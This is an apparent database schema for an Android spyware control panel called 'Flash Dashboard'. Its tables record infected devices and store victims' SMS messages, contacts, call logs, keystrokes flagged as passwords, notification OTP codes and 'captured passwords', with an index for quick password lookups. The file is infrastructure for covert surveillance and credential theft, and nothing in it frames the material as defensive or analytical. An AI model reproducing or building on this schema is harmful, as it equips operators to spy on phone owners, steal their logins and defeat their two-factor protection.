-- Flash Dashboard PostgreSQL Schema

-- Operators (dashboard users)
CREATE TABLE IF NOT EXISTS operators (
  id SERIAL PRIMARY KEY,
  username VARCHAR(64) UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- Devices
CREATE TABLE IF NOT EXISTS devices (
  id VARCHAR(64) PRIMARY KEY,
  alias VARCHAR(128),
  model VARCHAR(128),
  android_version VARCHAR(32),
  manufacturer VARCHAR(64),
  phone_number VARCHAR(32),
  carrier VARCHAR(64),
  ip_address VARCHAR(64),
  is_rooted BOOLEAN DEFAULT FALSE,
  battery_level INT,
  wifi_ssid VARCHAR(128),
  country VARCHAR(64),
  permissions JSONB DEFAULT '{}',
  last_seen TIMESTAMPTZ DEFAULT NOW(),
  first_seen TIMESTAMPTZ DEFAULT NOW(),
  is_online BOOLEAN DEFAULT FALSE
);

-- SMS
CREATE TABLE IF NOT EXISTS sms (
  id BIGSERIAL PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  sms_id VARCHAR(64),
  address VARCHAR(128),
  body TEXT,
  date BIGINT,
  type INT,
  is_read BOOLEAN DEFAULT FALSE,
  received_at TIMESTAMPTZ DEFAULT NOW()
);

-- Contacts
CREATE TABLE IF NOT EXISTS contacts (
  id BIGSERIAL PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  contact_id VARCHAR(64),
  name VARCHAR(256),
  phone VARCHAR(128),
  email VARCHAR(256),
  received_at TIMESTAMPTZ DEFAULT NOW()
);

-- Call log
CREATE TABLE IF NOT EXISTS calls (
  id BIGSERIAL PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  call_id VARCHAR(64),
  number VARCHAR(128),
  name VARCHAR(256),
  duration INT,
  date BIGINT,
  type INT,
  received_at TIMESTAMPTZ DEFAULT NOW()
);

-- Keylogs
CREATE TABLE IF NOT EXISTS keylogs (
  id BIGSERIAL PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  app_name VARCHAR(256),
  package_name VARCHAR(256),
  text TEXT,
  is_password BOOLEAN DEFAULT FALSE,
  timestamp BIGINT,
  received_at TIMESTAMPTZ DEFAULT NOW()
);

-- Notifications
CREATE TABLE IF NOT EXISTS notifications (
  id BIGSERIAL PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  package_name VARCHAR(256),
  title TEXT,
  body TEXT,
  is_otp BOOLEAN DEFAULT FALSE,
  otp_code VARCHAR(32),
  post_time BIGINT,
  received_at TIMESTAMPTZ DEFAULT NOW()
);

-- Captured passwords/data
CREATE TABLE IF NOT EXISTS captured_data (
  id BIGSERIAL PRIMARY KEY,
  device_id VARCHAR(64) NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  data_type VARCHAR(64),
  raw_json JSONB,
  received_at TIMESTAMPTZ DEFAULT NOW()
);

-- Indexes for performance
CREATE INDEX IF NOT EXISTS idx_sms_device ON sms(device_id);
CREATE INDEX IF NOT EXISTS idx_contacts_device ON contacts(device_id);
CREATE INDEX IF NOT EXISTS idx_calls_device ON calls(device_id);
CREATE INDEX IF NOT EXISTS idx_keylogs_device ON keylogs(device_id);
CREATE INDEX IF NOT EXISTS idx_notifications_device ON notifications(device_id);
CREATE INDEX IF NOT EXISTS idx_keylogs_password ON keylogs(device_id, is_password);
CREATE INDEX IF NOT EXISTS idx_devices_online ON devices(is_online);
